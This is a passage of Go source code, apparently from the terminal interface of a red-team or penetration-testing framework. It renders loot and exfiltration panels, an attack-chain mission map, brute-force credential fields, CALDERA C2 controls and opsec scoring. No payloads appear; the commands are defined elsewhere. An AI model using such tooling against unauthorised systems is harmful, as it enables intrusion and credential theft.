			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render(ternary(m.lootRawMode, "raw content", "preview")),
			wrap(ternary(m.lootRawMode, lootRawContent(m.root, item), item.Preview), rightWidth-4),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("next move"),
			renderTips(tips, rightWidth-4),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("operator actions"),
		)
		lootActions := lootFollowupActions(item, m.state.TargetURL, m.root)
		if len(lootActions) > 0 {
			actionPos := clamp(m.lootActionIdx, 0, len(lootActions)-1)
			selectedAction := lootActions[actionPos]
			for idx, candidate := range lootActions {
				prefix := "  "
				style := lipgloss.NewStyle().Foreground(lipgloss.Color("245"))
				if idx == actionPos {
					prefix = "▸ "
					style = lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true)
				}
				detailLines = append(detailLines, style.Render(prefix+truncate(candidate.Label, rightWidth-8)))
			}
			detailLines = append(detailLines,
				"",
				lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("selected action command"),
				wrap(selectedAction.Command, rightWidth-4),
				lipgloss.NewStyle().Foreground(lipgloss.Color("208")).Render("opsec :: "+lootOpsecAlert(selectedAction)),
				metricLine("opsec meter", opsecMeter(actionEffectiveOpsecScore(selectedAction, m.commands))),
			)
		} else {
			detailLines = append(detailLines, "no mapped operator action")
		}
		detailLines = append(detailLines,
			metricLine("trigger", "Enter or f"),
			metricLine("status", valueOr(m.lootFireStatus, "idle")+" "+taxonomyAnimation(m.lootFireOutcome, m.lootFireBusy, m.lootFireUntil)),
			lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Render("tip: ,/. cycles operator actions"),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Render("tip: press v to toggle raw/analyzed view"),
			lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Render("tip: press o for fog mission view, c for ONCHAIN scope, g for CO-OP mode"),
		)
		if out := strings.TrimSpace(m.lootFireOutput); out != "" {
			detailLines = append(detailLines,
				"",
				lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("last loot action output"),
				wrap(truncate(out, max(120, rightWidth*2)), rightWidth-4),
			)
		}
		detail = strings.Join(detailLines, "\n")
	}
	if len(order) == 0 {
		detail = strings.Join([]string{
			metricLine("scope", ternary(m.lootOnchainMode, "ONCHAIN", "EXPLOIT")),
			lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Render("tip: press o for fog mission view, c for ONCHAIN scope, g for CO-OP mode"),
			"",
			loadingPanel(ternary(m.lootOnchainMode, "awaiting onchain artifacts", "awaiting exfiltrated artifacts"), m.currentLoadingFrame(), rightWidth),
		}, "\n")
	}
	return lipgloss.JoinHorizontal(
		lipgloss.Top,
		paneScrolled("[LOOT] EXTRACTED DATA :: "+ternary(m.lootOnchainMode, "ONCHAIN", "EXPLOIT"), leftBody, leftWidth, m.height-6, leftOffset),
		paneScrolled("[ARCH] LOOT DETAIL", detail, rightWidth, m.height-6, m.lootDetailScroll),
	)
}

func (m model) selectedLootFogStage() lootFogStage {
	if len(lootFogVisualOrder) == 0 {
		return lootFogStage{Key: "recon", Title: "Frontal Surface Recon", Group: "Recon"}
	}
	key := lootFogVisualOrder[clamp(m.lootFogStageIdx, 0, len(lootFogVisualOrder)-1)]
	return lootFogStageByKey(key)
}

func lootFogStageByKey(key string) lootFogStage {
	for _, item := range lootFogStages {
		if strings.EqualFold(item.Key, key) {
			return item
		}
	}
	return lootFogStage{Key: "recon", Title: "Frontal Surface Recon", Group: "Recon"}
}

func stageStateTag(stage lootFogStage, snap chainSnapshot) string {
	if ok, _ := requirementsReady(stage.Requires, snap); !ok {
		return "FOG"
	}
	if requirementReady(stage.Key, snap) || (stage.Key == "surface" && snap.Recon) || (stage.Key == "objective" && snap.PrivEsc) {
		return "PWN"
	}
	return "OPEN"
}

func colorStageLabel(label, state string, selected bool) string {
	label = truncate(label, 18)
	style := lipgloss.NewStyle()
	switch state {
	case "PWN":
		style = style.Foreground(lipgloss.Color("196")).Bold(true)
	case "OPEN":
		style = style.Foreground(lipgloss.Color("220")).Bold(true)
	default:
		style = style.Foreground(lipgloss.Color("240"))
	}
	if selected {
		style = style.Foreground(lipgloss.Color("231")).Underline(true).Bold(true)
	}
	return style.Render(label)
}

func renderLootFogSkull(snap chainSnapshot, selected string) string {
	frontalStage := lootFogStageByKey("recon")
	orbitalStage := lootFogStageByKey("surface")
	maxillaryStage := lootFogStageByKey("breach")
	infraStage := lootFogStageByKey("access")
	mandibleStage := lootFogStageByKey("objective")
	orbit := colorStageLabel("Orbital", stageStateTag(orbitalStage, snap), strings.EqualFold(selected, "surface"))
	frontal := colorStageLabel("Frontal", stageStateTag(frontalStage, snap), strings.EqualFold(selected, "recon"))
	maxillary := colorStageLabel("Maxillary", stageStateTag(maxillaryStage, snap), strings.EqualFold(selected, "breach"))
	infra := colorStageLabel("Infraorbital", stageStateTag(infraStage, snap), strings.EqualFold(selected, "access"))
	mandible := colorStageLabel("Mandibular", stageStateTag(mandibleStage, snap), strings.EqualFold(selected, "objective"))
	return strings.Join([]string{
		"              ___           _,.---,---.,_",
		"              |         ,;~'             '~;,",
		"              |       ,;                     ;,",
		"     " + frontal + "  |      ;                         ; ,--- " + orbit,
		"              |     ,'                         /'",
		"              |    ,;                        /' ;,",
		"              |    ; ;      .           . <-'  ; |",
		"              |__  | ;   ______       ______   ;",
		"             ___   |  '/~\"     ~\" . \"~     \"~\\'  |",
		"             |     |  ~  ,-~~~^~, | ,~^~~~-,  ~  |",
		"    " + maxillary + "  |      |   |        }:{        |",
		"             |      |   l       / | \\       !   |",
		"             |      .~  (__,.--\" .^. \"--.,__)  ~.",
		"             |      |    ----;' / | \\ `;-<--------- " + infra,
		"             |__     \\__.       \\/^\\/       .__/",
		"                ___   V| \\                 / |V",
		"                |      | |T~\\___!___!___/~T| |",
		"                |      | |`IIII_I_I_I_IIII'| |",
		"                |      |  \\,III I I I III,/  |",
		"    " + mandible + " |       \\   `~~~~~~~~~~'    /",
		"                |         \\   .       .",
		"                |__         \\.    ^    ./",
		"                              ^~~~^~~~^",
	}, "\n")
}

func (m model) lootFogStageActions() []controlAction {
	stage := m.selectedLootFogStage()
	snap := deriveChainSnapshot(m.commands, m.findings, m.loot)
	if ok, _ := requirementsReady(stage.Requires, snap); !ok {
		return nil
	}
	all := m.filterUnsupportedKaliActions(m.exploitFireActions())
	actions := make([]controlAction, 0, 8)
	for _, action := range all {
		if !strings.EqualFold(action.Group, stage.Group) {
			continue
		}
		if strings.EqualFold(action.Mode, "internal") {
			continue
		}
		if strings.Contains(strings.ToUpper(action.Label), "[MENU]") {
			continue
		}
		actions = append(actions, action)
	}
	return actions
}

func (m *model) submitLootFogAction() tea.Cmd {
	actions := m.lootFogStageActions()
	if len(actions) == 0 {
		m.lootFireBusy = false
		m.lootFireStatus = "blocked :: selected fog stage has no runnable commands"
		m.lootFireOutcome = "failed"
		m.lootFireUntil = time.Now().Add(1900 * time.Millisecond)
		return nil
	}
	m.lootFogActionIdx = clamp(m.lootFogActionIdx, 0, len(actions)-1)
	action := actions[m.lootFogActionIdx]
	if ok, reason := m.preflightControlAction(action); !ok {
		m.lootFireBusy = false
		m.lootFireStatus = "preflight failed :: " + reason
		m.lootFireOutcome = "failed"
		m.lootFireUntil = time.Now().Add(1900 * time.Millisecond)
		return nil
	}
	m.lootFireBusy = true
	m.lootFireStatus = "running :: " + truncate(action.Label, 56)
	m.lootFireCommand = valueOr(action.Command, action.KaliShell)
	m.lootFireOutput = ""
	m.lootFireOutcome = "running"
	return lootCmd(m.root, action)
}

func (m model) lootFogView() string {
	leftWidth := max(66, m.width/2)
	rightWidth := m.width - leftWidth - 2
	snap := deriveChainSnapshot(commandsByMode(m.commands, "exploit"), findingsByMode(m.findings, "exploit"), lootByMode(m.loot, "exploit"))
	stage := m.selectedLootFogStage()
	actions := m.lootFogStageActions()
	left := pane("[LOOT] FOG-OF-WAR MISSION MAP", renderLootFogSkull(snap, stage.Key), leftWidth, m.height-6)
	lines := []string{
		metricLine("stage", stage.Title),
		metricLine("group", strings.ToUpper(stage.Group)),
		metricLine("state", stageStateTag(stage, snap)),
		metricLine("ctrl lane", "exploit > FIRE > "+strings.ToUpper(stage.Group)),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("stage order"),
	}
	for i, key := range lootFogVisualOrder {
		item := lootFogStageByKey(key)
		prefix := "  "
		style := lipgloss.NewStyle().Foreground(lipgloss.Color("245"))
		if i == clamp(m.lootFogStageIdx, 0, len(lootFogVisualOrder)-1) {
			prefix = "▸ "
			style = lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true)
		}
		state := stageStateTag(item, snap)
		lines = append(lines, style.Render(prefix+fmt.Sprintf("%d. %s [%s]", i+1, truncate(item.Title, max(20, rightWidth-20)), state)))
	}
	lines = append(lines,
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("mission brief"),
		wrap(stage.Description, rightWidth-4),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("mapped commands"),
	)
	if len(actions) == 0 {
		lines = append(lines, "no runnable commands in this stage yet (locked or unavailable)")
	} else {
		idx := clamp(m.lootFogActionIdx, 0, len(actions)-1)
		for i, action := range actions {
			prefix := "  "
			style := lipgloss.NewStyle().Foreground(lipgloss.Color("245"))
			if i == idx {
				prefix = "▸ "
				style = lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true)
			}
			lines = append(lines, style.Render(prefix+truncate(action.Label, rightWidth-8)))
			lines = append(lines, "   "+lipgloss.NewStyle().Foreground(lipgloss.Color("242")).Render(truncate(valueOr(action.Description, "no description"), rightWidth-10)))
		}
		selected := actions[idx]
		lines = append(lines,
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("selected command"),
			wrap(valueOr(selected.Description, "no description"), rightWidth-4),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("command"),
			wrap(valueOr(selected.Command, selected.KaliShell), rightWidth-4),
			lipgloss.NewStyle().Foreground(lipgloss.Color("208")).Render("opsec :: "+lootOpsecAlert(selected)),
			metricLine("opsec meter", opsecMeter(actionEffectiveOpsecScore(selected, m.commands))),
		)
	}
	lines = append(lines,
		"",
		metricLine("controls", "↑/↓ stage  ,/. command  enter/f run  o exit fog"),
		metricLine("status", valueOr(m.lootFireStatus, "idle")+" "+taxonomyAnimation(m.lootFireOutcome, m.lootFireBusy, m.lootFireUntil)),
	)
	if out := strings.TrimSpace(m.lootFireOutput); out != "" {
		lines = append(lines,
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("last output"),
			wrap(truncate(out, max(120, rightWidth*2)), rightWidth-4),
		)
	}
	return lipgloss.JoinHorizontal(
		lipgloss.Top,
		left,
		paneScrolled("[ARCH] FOG MISSION DETAIL", strings.Join(lines, "\n"), rightWidth, m.height-6, m.lootDetailScroll),
	)
}

func (m model) taxonomyView() string {
	leftWidth := max(66, m.width/2)
	rightWidth := m.width - leftWidth - 2
	if len(osintTaxonomyPoints) == 0 {
		return pane("[OSINT] PIPELINE TAXONOMY", "no osint taxonomy points configured", m.width-2, m.height-6)
	}
	point := osintTaxonomyPoints[clamp(m.osintTaxIdx, 0, len(osintTaxonomyPoints)-1)]
	osintLoot := lootSubsetByMode(m.loot, true, false)
	entities := osintTaxonomyEntities(point, m.commands, m.findings, osintLoot)
	dataLoc := osintDataLocations(m.root, 14)

	left := pane("[OSINT] PIPELINE TAXONOMY", renderOSINTTaxonomyMap(point.Key), leftWidth, m.height-6)

	lines := []string{
		metricLine("node", badgePill(strings.ToUpper(point.Marker), "99", "230")),
		metricLine("phase", badgePill(point.Phase, "57", "230")),
		metricLine("events", fmt.Sprintf("%d", len(entities))),
		metricLine("osint loot", fmt.Sprintf("%d", len(osintLoot))),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("pipeline explainer"),
		wrap(point.Description, rightWidth-4),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("journalist workflow"),
		renderTips(osintPointWorkflow(point, m.state.TargetURL, m.selectedOsintDeepEngine()), rightWidth-4),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("collected data locations"),
		renderTips(dataLoc, rightWidth-4),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("selection"),
		wrap(taxonomySelectionHint(false), rightWidth-4),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("osint entities"),
	}
	if len(entities) == 0 {
		lines = append(lines, "no mapped telemetry for this osint phase yet")
	} else {
		for i, item := range entities {
			if i >= 12 {
				lines = append(lines, lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Render(fmt.Sprintf("+%d more", len(entities)-i)))
				break
			}
			lines = append(lines, fmt.Sprintf("%s %s", kindBadge(item.Kind), truncate(item.Label, rightWidth-8)))
			lines = append(lines, lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render(wrap(item.Detail, rightWidth-6)))
		}
	}
	lines = append(lines,
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("osint result stream"),
		osintLootStream(osintLoot, rightWidth-4, 10),
	)
	right := paneScrolled("[ARCH] CATEGORY DETAIL", strings.Join(lines, "\n"), rightWidth, m.height-6, 0)
	return lipgloss.JoinHorizontal(lipgloss.Top, left, right)
}

func (m model) controlView() string {
	leftWidth := max(58, m.width/2)
	rightWidth := m.width - leftWidth - 2
	mode := strings.ToLower(strings.TrimSpace(m.fireMode))
	if mode == "" {
		mode = "exploit"
	}
	scopedCommands := commandsByMode(m.commands, mode)
	scopedFindings := findingsByMode(m.findings, mode)
	scopedLoot := lootByMode(m.loot, mode)
	activeActions := m.activeControlActions()
	sections := []string{"launch", "target", "fire", "history"}
	sectionBadges := make([]string, 0, len(sections))
	for i, name := range sections {
		style := lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Padding(0, 1)
		if i == m.controlSection {
			style = style.Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true).Padding(0, 1)
		}
		sectionBadges = append(sectionBadges, style.Render(strings.ToUpper(name)))
	}

	scopeLabel := strings.ToUpper(mode)
	profileLabel := strings.ToUpper(modeOperatorProfile(mode))
	sectionDetail := map[string]string{"launch": "bootstrap + verify stack", "target": "set inputs + scope profile", "fire": "run modular operator actions", "history": "replay and evidence snapshots"}
	lines := []string{
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("category navigator"),
		"[] section  |  ↑/↓ category  |  ./, option",
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("sections"),
		strings.Join(sectionBadges, " "),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("active section"),
		strings.ToUpper(m.currentControlSectionLabel()) + " :: " + sectionDetail[m.currentControlSectionLabel()],
	}
	lines = append(lines,
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("section categories"),
	)
	if m.controlSection == 2 && strings.EqualFold(m.fireMode, "exploit") {
		for i, group := range exploitFireGroups() {
			prefix := "  "
			style := lipgloss.NewStyle().Foreground(lipgloss.Color("250"))
			if i == clamp(m.exploitFireGroupIdx, 0, len(exploitFireGroups())-1) {
				prefix = "▸ "
				style = lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true)
			}
			lines = append(lines, style.Render(prefix+strings.ToUpper(group)))
		}
	} else {
		for i, action := range activeActions {
			prefix := "  "
			style := lipgloss.NewStyle().Foreground(lipgloss.Color("250"))
			if i == m.activeControlIndex() {
				prefix = "▸ "
				style = lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true)
			}
			lines = append(lines, style.Render(prefix+truncate(action.Label, max(24, leftWidth-8))))
		}
		if len(activeActions) == 0 {
			lines = append(lines, "no categories/actions available")
		}
	}
	lines = append(lines,
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("active target"),
		metricLine("scope", scopeLabel),
		metricLine("operator", profileLabel),
		metricLine("name", valueOr(m.state.TargetName, "waiting")),
		metricLine("kind", valueOr(m.state.TargetKind, "custom")),
		metricLine("url", valueOr(m.state.TargetURL, "n/a")),
		metricLine("selected replay", m.selectedReplayRunLabel()),
	)
	if strings.EqualFold(mode, "exploit") {
		lines = append(lines,
			metricLine("fire target", valueOr(strings.TrimSpace(m.effectiveExploitTargetURL()), "n/a")),
		)
	}
	if m.manualTargetMode {
		modeLabel := "URL"
		if strings.EqualFold(m.manualTargetKind, "osint") {
			modeLabel = "OSINT (" + strings.ToUpper(m.selectedOsintInputType()) + ")"
		} else if strings.EqualFold(m.manualTargetKind, "onchain") {
			modeLabel = "ONCHAIN (" + strings.ToUpper(m.selectedOnchainInputType()) + ")"
		} else if strings.EqualFold(m.manualTargetKind, "kali-container") {
			modeLabel = "KALI CONTAINER"
		} else if strings.EqualFold(m.manualTargetKind, "kali-image") {
			modeLabel = "KALI IMAGE"
		} else if strings.EqualFold(m.manualTargetKind, "coop-url") {
			modeLabel = "CO-OP CALDERA URL"
		} else if strings.EqualFold(m.manualTargetKind, "coop-key") {
			modeLabel = "CO-OP CALDERA API KEY"
		} else if strings.EqualFold(m.manualTargetKind, "coop-operation") {
			modeLabel = "CO-OP OPERATION NAME"
		} else if strings.EqualFold(m.manualTargetKind, "coop-agent-group") {
			modeLabel = "CO-OP AGENT GROUP"
		} else if strings.EqualFold(m.manualTargetKind, "module-input") {
			modeLabel = "MODULE INPUT (" + strings.ToUpper(m.moduleInputModuleID) + ")"
		} else if strings.EqualFold(m.manualTargetKind, "custom-command") {
			modeLabel = "CUSTOM COMMAND"
		} else if strings.EqualFold(m.manualTargetKind, "inner-target") {
			modeLabel = "INNER FIRE TARGET"
		} else if strings.EqualFold(m.manualTargetKind, "brute-manual-cred") {
			modeLabel = "BRUTE MANUAL CREDENTIAL"
		} else if strings.EqualFold(m.manualTargetKind, "brute-manual-token") {
			modeLabel = "BRUTE MANUAL TOKEN"
		} else if strings.EqualFold(m.manualTargetKind, "arch-edit-endpoint") {
			modeLabel = "MAP EDIT ENDPOINT"
		} else if strings.EqualFold(m.manualTargetKind, "arch-edit-payload") {
			modeLabel = "MAP EDIT PAYLOAD"
		} else if strings.EqualFold(m.manualTargetKind, "arch-edit-field-value") {
			modeLabel = "MAP EDIT FIELD VALUE"
		}
		lines = append(lines,
			lipgloss.NewStyle().Foreground(lipgloss.Color("212")).Render("manual input active :: "+modeLabel),
			lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Render("> "+m.manualTargetInput),
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("type value, Enter applies, Esc cancels"),
		)
	}

	status := "idle"
	if m.controlBusy {
		status = "running"
	}
	if m.controlStatus != "" {
		status = m.controlStatus
	}
	output := strings.TrimSpace(m.controlOutput)
	if output == "" {
		if m.controlBusy {
			output = loadingPanel("operator command in-flight", m.currentLoadingFrame(), rightWidth-4)
		} else {
			output = "no command output yet"
		}
	}
	selectedAction := controlAction{}
	if len(activeActions) > 0 {
		selectedAction = activeActions[clamp(m.activeControlIndex(), 0, len(activeActions)-1)]
	}
	rightLines := []string{
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("operation state"),
		metricLine("mode", scopeLabel),
		metricLine("section", strings.ToUpper(m.currentControlSectionLabel())),
		metricLine("status", status+" "+taxonomyAnimation(m.controlOutcome, m.controlBusy, m.controlUntil)),
		metricLine("preflight", valueOr(strings.TrimSpace(m.controlPreflightWarning), "clean")),
		metricLine("last action", valueOr(m.controlLastLabel, "none")),
		metricLine("last command", valueOr(m.controlLastCommand, "none")),
		operationStateSummary(mode, scopedCommands, scopedFindings, scopedLoot, rightWidth-4),
		ternary(strings.EqualFold(mode, "coop"), lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Render(coopTutorialHint(scopedCommands)), ""),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("category options"),
		m.controlOptionsPanel(rightWidth-4, activeActions),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("next best action"),
		nextBestActionCard(scopedCommands, scopedFindings, scopedLoot, m.state.TargetURL, rightWidth-4),
		metricLine("selected opsec", opsecMeter(actionEffectiveOpsecScore(selectedAction, scopedCommands))),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("command result"),
		output,
	}

	return lipgloss.JoinHorizontal(
		lipgloss.Top,
		pane("[CTRL] INTERACTIVE LAUNCH + FIRE", strings.Join(lines, "\n"), leftWidth, m.height-6),
		paneScrolled("[CTRL] OP STATE + RESULT", strings.Join(rightLines, "\n"), rightWidth, m.height-6, m.controlDetailScroll),
	)
}

func coopTutorialHint(commands []commandEntry) string {
	switch {
	case !hasCommandMatch(commands, "coop-caldera-up"):
		return "hint :: CTRL/LAUNCH -> [GUIDED] Co-op Quickstart then [COOP] Start CALDERA C2"
	case !hasCommandMatch(commands, "coop-caldera-status"):
		return "hint :: run [COOP] CALDERA Status to verify C2/API health"
	case !hasCommandMatch(commands, "/api/agents") || !hasCommandMatch(commands, "/api/operations"):
		return "hint :: run [COOP] List Agents + [COOP] List Operations"
	case !hasCommandMatch(commands, "coop-caldera-op-report"):
		return "hint :: run [COOP] Pull Operation Snapshot to persist artifacts/coop"
	default:
		return "hint :: co-op loop ready (status -> agents -> operations -> report)"
	}
}

func (m model) selectedControlOptionLabel(section int) string {
	switch section {
	case 0:
		actions := m.launchActions()
		if len(actions) == 0 {
			return ""
		}
		return actions[clamp(m.launchIdx, 0, len(actions)-1)].Label
	case 1:
		actions := m.targetActions()
		if len(actions) == 0 {
			return ""
		}
		return actions[clamp(m.targetIdx, 0, len(actions)-1)].Label
	case 2:
		actions := m.fireActions()
		if len(actions) == 0 {
			return ""
		}
		return actions[clamp(m.fireIdx, 0, len(actions)-1)].Label
	case 3:
		actions := m.historyActions()
		if len(actions) == 0 {
			return ""
		}
		return actions[clamp(m.historyIdx, 0, len(actions)-1)].Label
	default:
		return ""
	}
}

func (m model) currentControlSectionLabel() string {
	sections := []string{"launch", "target", "fire", "history"}
	if m.controlSection < 0 || m.controlSection >= len(sections) {
		return "launch"
	}
	return sections[m.controlSection]
}

func (m model) currentControlTelemetryPhase() string {
	section := strings.ToLower(strings.TrimSpace(m.currentControlSectionLabel()))
	if section == "fire" {
		mode := strings.ToLower(strings.TrimSpace(m.fireMode))
		if mode != "" {
			return mode
		}
		return "exploit"
	}
	if section == "" {
		return "control"
	}
	return "control-" + section
}

func operationStateSummary(mode string, commands []commandEntry, findings []findingEntry, loot []lootEntry, width int) string {
	total := len(commands)
	ok, fail := 0, 0
	for _, cmd := range commands {
		switch strings.ToLower(strings.TrimSpace(cmd.Status)) {
		case "ok", "done", "complete", "completed":
			ok++
		case "error", "failed", "fail":
			fail++
		}
	}
	latestPhase := "n/a"
	if total > 0 {
		latestPhase = valueOr(strings.TrimSpace(commands[total-1].Phase), "n/a")
	}
	lines := []string{
		metricLine("jobs", fmt.Sprintf("%d (ok=%d fail=%d)", total, ok, fail)),
		metricLine("findings", fmt.Sprintf("%d", len(findings))),
		metricLine("loot", fmt.Sprintf("%d", len(loot))),
		metricLine("latest phase", latestPhase),
	}
	switch strings.ToLower(strings.TrimSpace(mode)) {
	case "exploit":
		s := deriveChainSnapshot(commands, findings, loot)
		lines = append(lines, "chain :: "+
			fmt.Sprintf("RECON:%s BREACH:%s ACCESS:%s EXFIL:%s TAMPER:%s PRIVESC:%s",
				ternary(s.Recon, "done", "todo"),
				ternary(s.Breach, "done", "todo"),
				ternary(s.Access, "done", "todo"),
				ternary(s.Exfil, "done", "todo"),
				ternary(s.Tamper, "done", "todo"),
				ternary(s.PrivEsc, "done", "todo"),
			))
	case "osint":
		entitiesMapped := 0
		if len(osintTaxonomyPoints) > 0 {
			entitiesMapped = len(osintTaxonomyEntities(osintTaxonomyPoints[0], commands, findings, loot))
		}
		lines = append(lines, metricLine("entities mapped", fmt.Sprintf("%d", entitiesMapped)))
	case "onchain":
		lines = append(lines, metricLine("flow artifacts", fmt.Sprintf("%d", countOnchainFlowArtifacts(loot))))
	case "coop":
		agentQueries := 0
		opQueries := 0
		for _, cmd := range commands {
			meta := strings.ToLower(cmd.Command + " " + cmd.Tool + " " + cmd.Phase)
			if strings.Contains(meta, "/api/agents") || strings.Contains(meta, "coop-caldera-status") {
				agentQueries++
			}
			if strings.Contains(meta, "/api/operations") || strings.Contains(meta, "op-report") {
				opQueries++
			}
		}
		lines = append(lines, metricLine("c2 probes", fmt.Sprintf("agents=%d operations=%d", agentQueries, opQueries)))
	}
	return wrap(strings.Join(lines, " | "), width)
}

func coopReadinessSummary(commands []commandEntry) (string, int) {
	up := hasCommandMatch(commands, "coop-caldera-up")
	status := hasCommandMatch(commands, "coop-caldera-status")
	agents := hasCommandMatch(commands, "/api/agents")
	operations := hasCommandMatch(commands, "/api/operations")
	report := hasCommandMatch(commands, "coop-caldera-op-report")
	score := 0
	if up {
		score += 20
	}
	if status {
		score += 25
	}
	if agents {
		score += 20
	}
	if operations {
		score += 20
	}
	if report {
		score += 15
	}
	score = clamp(score, 0, 100)
	switch {
	case score >= 85:
		return "operational", score
	case score >= 60:
		return "ready", score
	case score >= 30:
		return "warming", score
	default:
		return "cold", score
	}
}

func coopReadinessSteps(commands []commandEntry) string {
	step := func(done bool) string {
		if done {
			return "done"
		}
		return "todo"
	}
	up := hasCommandMatch(commands, "coop-caldera-up")
	status := hasCommandMatch(commands, "coop-caldera-status")
	agents := hasCommandMatch(commands, "/api/agents")
	operations := hasCommandMatch(commands, "/api/operations")
	report := hasCommandMatch(commands, "coop-caldera-op-report")
	return fmt.Sprintf("up:%s status:%s agents:%s ops:%s report:%s", step(up), step(status), step(agents), step(operations), step(report))
}

func (m model) controlOptionsPanel(width int, actions []controlAction) string {
	lines := []string{
		metricLine("section", strings.ToUpper(m.currentControlSectionLabel())),
		"nav :: [] section  |  ↑/↓ category  |  ./, option  |  Enter/f execute",
	}
	switch m.controlSection {
	case 1:
		lines = append(lines,
			metricLine("kali container", truncate(kaliContainerName(), max(20, width-20))),
			metricLine("kali image", truncate(kaliImageName(), max(20, width-16))),
		)
		if strings.EqualFold(m.fireMode, "coop") {
			lines = append(lines,
				metricLine("caldera url", truncate(m.selectedCoopCalderaURL(), max(20, width-16))),
				metricLine("api key", ternary(strings.TrimSpace(m.selectedCoopCalderaAPIKey()) == "", "unset", "set")),
				metricLine("operation", truncate(m.selectedCoopOperationName(), max(20, width-16))),
				metricLine("agent group", truncate(m.selectedCoopAgentGroup(), max(20, width-16))),
			)
		} else if strings.EqualFold(m.fireMode, "osint") {
			lines = append(lines, metricLine("osint seed type", strings.ToUpper(m.selectedOsintInputType())))
		} else if strings.EqualFold(m.fireMode, "onchain") {
			lines = append(lines,
				metricLine("onchain input type", strings.ToUpper(m.selectedOnchainInputType())),
				metricLine("network", m.selectedOnchainProfile().Label),
			)
		} else {
			mapped := exploitInnerTargets(findingsByMode(m.findings, "exploit"), lootByMode(m.loot, "exploit"), m.state.TargetURL)
			selected := "none"
			if len(mapped) > 0 {
				selected = mapped[clampWrap(m.exploitInnerTargetIdx, len(mapped))]
			}
			lines = append(lines,
				metricLine("cve task", m.selectedCVETask()),
				metricLine("inner targets", fmt.Sprintf("%d", len(mapped))),
				metricLine("selected inner", truncate(selected, max(20, width-18))),
				metricLine("fire target", truncate(m.effectiveExploitTargetURL(), max(20, width-16))),
			)
		}
	case 2:
		if strings.EqualFold(m.fireMode, "coop") {
			lines = append(lines,
				metricLine("caldera url", truncate(m.selectedCoopCalderaURL(), max(20, width-16))),
				metricLine("operation", truncate(m.selectedCoopOperationName(), max(20, width-16))),
				lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Render(coopTutorialHint(commandsByMode(m.commands, "coop"))),
			)
		} else if strings.EqualFold(m.fireMode, "osint") {
			lines = append(lines, metricLine("deep engine", strings.ToUpper(m.selectedOsintDeepEngine())))
		} else if strings.EqualFold(m.fireMode, "exploit") {
			view := "COMMANDS"
			if m.exploitPipelineMenu {
				view = "PIPELINES"
			}
			lines = append(lines,
				metricLine("fire view", view),
				metricLine("fire group (↑/↓)", strings.ToUpper(m.selectedExploitFireGroup())),
				metricLine("pipeline", selectedPipelineLabel(m.selectedPipelineName())),
			)
			if strings.EqualFold(m.selectedExploitFireGroup(), "Access") {
				selectedLoot := "none"
				if pair, ok := m.selectedLootCredentialPair(); ok {
					selectedLoot = pair.User + ":***"
				}
				lines = append(lines,
					metricLine("brute source", strings.ToUpper(m.selectedBruteCredentialSource())),
					metricLine("brute auth", strings.ToUpper(m.selectedBruteAuthMode())),
					metricLine("loot cred", truncate(selectedLoot, max(20, width-14))),
					metricLine("manual cred", ternary(strings.TrimSpace(m.exploitBruteManualUser) != "", m.exploitBruteManualUser+":***", "unset")),
					metricLine("manual token", ternary(strings.TrimSpace(m.exploitBruteManualToken) != "", "set", "unset")),
					metricLine("attack endpoint", truncate(m.effectiveExploitTargetURL(), max(20, width-18))),
				)
			}
		}
	case 3:
		lines = append(lines, metricLine("replay run", m.selectedReplayRunLabel()))
	}
	lines = append(lines, "")
	if len(actions) == 0 {
		lines = append(lines, "no actions available")
		return wrap(strings.Join(lines, "\n"), width)
	}
	selectedIdx := clamp(m.activeControlIndex(), 0, len(actions)-1)
	selected := actions[selectedIdx]
	selectedCommand := valueOr(selected.Command, "internal-action")
	if strings.EqualFold(strings.TrimSpace(selected.Mode), "kali") && strings.TrimSpace(selected.KaliShell) != "" {
